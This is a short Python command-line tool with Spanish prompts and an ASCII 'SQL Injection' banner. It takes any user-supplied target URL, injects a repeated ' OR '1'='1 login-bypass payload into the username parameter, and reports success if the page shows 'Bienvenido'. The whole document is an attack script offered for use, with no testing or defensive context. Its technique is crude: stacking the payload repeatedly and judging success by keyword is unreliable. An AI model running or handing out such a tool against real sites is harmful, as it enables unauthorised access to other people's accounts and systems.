# pip install requests
import urllib.parse
import requests

def sql_injection_main():
    target_url = input("Ingrese la URL objetivo: ")
    num_injections = int(input("Ingrese el número de inyecciones de SQL que desea generar: "))

    payload = "' OR '1'='1 " * num_injections

    try:
        # Codificar el payload para que sea seguro enviarlo en la URL
        encoded_payload = urllib.parse.quote(payload, safe='')

        # Construir la URL con el payload inyectado
        url = f"{target_url}?username={encoded_payload}&password=test"

        # Realizar la solicitud HTTP GET
        response = requests.get(url)

        # Analizar la respuesta y determinar si la inyección fue exitosa
        if "Bienvenido" in response.text:
            print("Inyección de SQL exitosa. Se encontró una vulnerabilidad.")
        else:
            print("No se encontraron indicios de inyección de SQL en la respuesta.")
    except Exception as e:
        print(f"Error: {e}")


def banner():
    cartel = r"""
      ___  ___  _      ___        _       _   _         
     / __|/ _ \| |    |_ _|_ _   (_)_____| |_(_)___ _ _   
     \__ \ (_) | |__   | || ' \ / / -_) _|  _| / _ \ ' \ 
     |___/\__\_\____| |___|_||_| /\___\__|\__|_\___/_||_|
                            __/ /
                           |___/                    
    """
    print(cartel)

if __name__ == "__main__":
    banner()
    print("******************************************************")
    sql_injection_main()